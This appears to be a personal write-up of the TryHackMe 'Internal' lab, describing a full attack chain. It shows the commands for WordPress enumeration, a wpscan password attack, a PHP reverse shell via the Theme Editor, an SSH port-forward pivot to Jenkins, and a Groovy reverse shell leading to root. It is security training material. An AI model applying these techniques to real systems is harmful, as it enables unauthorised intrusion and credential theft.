# TryHackMe — Internal

> **Difficulty:** Hard  
> **Platform:** TryHackMe  
> **Category:** Web / Privilege Escalation / Pivoting / Docker  
> **Status:** Completed

## Overview

This write-up documents my own approach to the **Internal** room on TryHackMe.

The assessment was approached as a black-box penetration test, with minimal information about the target and no predefined attack path.

I did **not follow a walkthrough**. The attack chain below was built progressively through enumeration, experimentation, failed attempts, credential discovery, and analysis of the services available after each stage of compromise.

> Credentials and flags are redacted from this public version.

---

## Attack Path

```text
External Reconnaissance
        │
        ▼
   Apache / WordPress
        │
        ▼
WordPress Enumeration
        │
        ▼
Admin User Discovery
        │
        ▼
Credential Attack
        │
        ▼
WordPress Administrator
        │
        ▼
Theme Editor → PHP RCE
        │
        ▼
     www-data
        │
        ▼
Local Enumeration
        │
        ▼
aubreanna Credentials
        │
        ▼
   SSH → aubreanna
        │
        ▼
Internal Jenkins Discovery
        │
        ▼
 SSH Port Forwarding
        │
        ▼
       Jenkins
        │
        ▼
Jenkins Credential Attack
        │
        ▼
Jenkins Administrator
        │
        ▼
Groovy Script → RCE
        │
        ▼
 Jenkins Container
        │
        ▼
Plaintext Root Credentials
        │
        ▼
    SSH → root
        │
        ▼
    root.txt


---

1. Reconnaissance

I started with a standard Nmap scan:

nmap -sV -sC -Pn 10.67.129.42

Interesting services:

22/tcp  open  ssh   OpenSSH 7.6p1
80/tcp  open  http  Apache 2.4.29

The HTTP service initially returned the default Apache page.

At this point, I had two main attack surfaces:

SSH

HTTP


I decided to focus on HTTP first because there appeared to be more opportunities for enumeration.


---

2. Web Enumeration

I started directory enumeration with Gobuster:

gobuster dir \
-u http://10.67.129.42/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-x html,js,php,bak

Several interesting endpoints were discovered:

/blog
/javascript
/phpmyadmin
/wordpress
/server-status

The /blog endpoint immediately looked interesting, so I enumerated it separately:

gobuster dir \
-u http://10.67.129.42/blog/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-x html,js,php,bak

This revealed several WordPress-related endpoints:

/wp-content
/wp-admin
/wp-includes
/xmlrpc.php
/wp-trackback.php
/wp-login.php
/readme.html

At this point it was clear that the application was running WordPress.


---

3. WordPress Enumeration

One of the first things I investigated was xmlrpc.php.

I checked which XML-RPC methods were exposed:

curl -s -X POST \
-H 'Content-Type: text/xml' \
-d '<?xml version="1.0"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params/>
</methodCall>' \
http://internal.thm/blog/xmlrpc.php

The server returned a large list of available methods, including:

wp.getUsers
wp.getUser
wp.getPosts
wp.getPost
wp.getComments
wp.getComment
wp.uploadFile
wp.newPost
wp.editPost
wp.getUsersBlogs
...

This increased the attack surface considerably.

I initially investigated whether these methods could be used to enumerate WordPress users directly, but authentication was required for the relevant methods.

I then moved on to the WordPress REST API.


---

4. User Enumeration

I discovered the WordPress REST API and queried the users endpoint:

curl -s \
"http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1"

The response exposed the WordPress administrator account:

admin

It also exposed the associated email address:

admin@internal.thm

I now had a valid WordPress username.

I also noticed that the login page returned different responses for existing and non-existing usernames.

For example:

Unknown username. Check again or try your email address.

versus:

The password you entered for the username admin is incorrect.

This confirmed that username enumeration was possible.


---

5. Credential Attack

After identifying the admin account, I decided to test whether the account used a weak password.

I chose WPScan because it is specifically designed for WordPress enumeration and password attacks:

wpscan \
--url http://internal.thm/blog/ \
--usernames admin \
--passwords /usr/share/wordlists/rockyou.txt \
--password-attack wp-login

A valid password was eventually recovered.

Username: admin
Password: [REDACTED]

This provided administrative access to WordPress.


---

6. Initial Access

With administrator access, I investigated the WordPress administration panel.

I considered the usual WordPress attack surfaces, including plugins and themes.

The Theme Editor allowed PHP files belonging to the active theme to be modified.

I used this functionality to execute a PHP reverse shell.

Listener:

nc -nlvp 4444

After triggering the modified PHP file, I received a shell:

www-data@internal:/$

I confirmed my privileges:

whoami

www-data

And:

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

This provided the initial foothold.


---

7. Local Enumeration

Now that I had a shell, I started enumerating the compromised host.

There were many directories, so I began manually exploring the filesystem.

One location that caught my attention was /opt:

ls -la /opt

Among the files I found:

/opt/wp-save.txt

I investigated it:

cat /opt/wp-save.txt

The file contained credentials for another user:

aubreanna:[REDACTED]

I also performed SUID enumeration:

find / --perm -4000 2>/dev/null

There were several SUID binaries, but rather than immediately forcing a privilege escalation through one of them, I decided to test the credentials I had just discovered.


---

8. Lateral Movement — aubreanna

I attempted to authenticate through SSH:

ssh aubreanna@10.67.129.42

Using the recovered credentials, authentication succeeded.

I was now:

aubreanna@internal

I checked the account:

id

uid=1000(aubreanna) gid=1000(aubreanna)

I then enumerated the user's home directory:

ls -la

Several files caught my attention, especially:

user.txt
jenkins.txt

I immediately checked the first flag:

cat user.txt

THM{[REDACTED]}

User flag obtained.


---

9. Internal Service Discovery

I then investigated jenkins.txt:

cat jenkins.txt

It contained:

Internal Jenkins service is running on 172.17.0.2:8080

This was interesting because the service appeared to be running inside the Docker network.

I checked the listening services:

netstat -ano

Among the results:

127.0.0.1:3306
127.0.0.1:8080

I also noticed the Docker socket:

/var/run/docker.sock

The important discovery was that Jenkins was not directly exposed externally.

Instead of ignoring it, I started thinking about how I could access a service that was only available from the target itself.


---

10. SSH Port Forwarding / Pivoting

Since I had valid SSH credentials for aubreanna, I realized I could use SSH tunneling to expose the internal Jenkins service to my own machine.

I created a local port forward:

ssh -L 8080:172.17.0.2:8080 aubreanna@10.67.129.42

The SSH connection remained open.

I then opened:

http://127.0.0.1:8080

And found the Jenkins login page.

This was my first real experience using SSH port forwarding to reach an internal service.

The resulting path was:

Attacker
   |
   | SSH
   v
aubreanna
   |
   | Port Forward
   v
172.17.0.2:8080
   |
   v
Jenkins


---

11. Jenkins Authentication

I initially had no Jenkins credentials.

I tested some obvious credentials manually, but they did not work.

I then decided to perform a password attack against the login page.

While analyzing the responses, I noticed that incorrect attempts returned a response of approximately 351 bytes, while one particular response was different.

I investigated the anomaly and eventually identified valid credentials:

Username: admin
Password: [REDACTED]

I now had access to Jenkins.

At this point I had never used Jenkins before, so I had to investigate how the application worked and what functionality could be abused.


---

12. Jenkins Remote Code Execution

After researching Jenkins functionality, I found that the Script Console could execute Groovy code.

This immediately stood out because arbitrary Groovy execution could potentially lead to operating system command execution.

I decided to test this by creating another reverse shell.

I started a listener:

nc -nlvp 8044

I then executed a Groovy reverse shell through Jenkins.

The connection came back:

connect to [192.168.128.133] from (UNKNOWN) [10.67.129.105]

I checked the privileges:

id

uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)

I initially expected this to give me root access.

It didn't.

I was only the jenkins user.

That meant there was another step.


---

13. Jenkins Container Enumeration

I started enumerating the environment from the Jenkins shell:

ls -la

One of the most interesting entries was:

.dockerenv

This confirmed that I was inside a Docker container.

I also checked for SUID binaries:

find / --perm -4000 2>/dev/null

No useful SUID path was identified in the container.

Since I had already found interesting information in /opt earlier in the assessment, I decided to investigate /opt again:

cd /opt
ls

There was a file:

note.txt

I read it:

cat note.txt

The file contained credentials for the root account:

root:[REDACTED]

This was the final credential discovery required for the attack chain.


---

14. Root Access

I tested the recovered credentials through SSH:

ssh root@10.67.129.42

Authentication succeeded.

The shell confirmed that I was root:

root@internal:~#

I listed the directory:

ls

And found:

root.txt

I retrieved the final flag:

cat root.txt

THM{[REDACTED]}

Root flag obtained.


---

Findings

#	Finding	Impact

1	WordPress username enumeration	Exposed a valid administrative username
2	Weak WordPress credentials	Enabled administrative access
3	WordPress Theme Editor enabled	Allowed arbitrary PHP code execution
4	Plaintext credentials in /opt/wp-save.txt	Enabled lateral movement
5	Internal Jenkins service	Exposed an additional attack surface after compromise
6	Weak Jenkins credentials	Enabled Jenkins administrative access
7	Jenkins Script Console	Allowed command execution
8	Plaintext root credentials in Jenkins container	Enabled root authentication



---

Key Takeaways

This room was a major step forward in my practical penetration-testing experience.

The most important lessons were:

Web application enumeration

WordPress enumeration

Credential attacks

Initial access through PHP execution

Linux post-exploitation

Credential discovery

Lateral movement

SSH port forwarding

Pivoting into internal services

Jenkins enumeration

Groovy-based command execution

Docker/container enumeration

Chaining multiple weaknesses into a complete compromise


The biggest lesson was that individual vulnerabilities were not the entire solution.

The attack required continuously asking:

> What can I access from where I am now?



The initial foothold as www-data was only the beginning. Each new piece of information led to another stage of the attack until full compromise was achieved.


---

Personal Note

This was the hardest TryHackMe machine I had completed at the time.

I did not start with knowledge of the intended attack path and did not follow a walkthrough. I spent a significant amount of time enumerating the target, testing ideas, researching unfamiliar technologies, and figuring out why certain approaches did or did not work.

The biggest milestones for me were successfully obtaining my first web shell, moving from www-data to aubreanna, discovering the internal Jenkins service, and performing my first real SSH-based pivot into an internal service.

This room significantly improved my understanding of how a real penetration test can develop from a small initial foothold into a multi-stage attack chain.
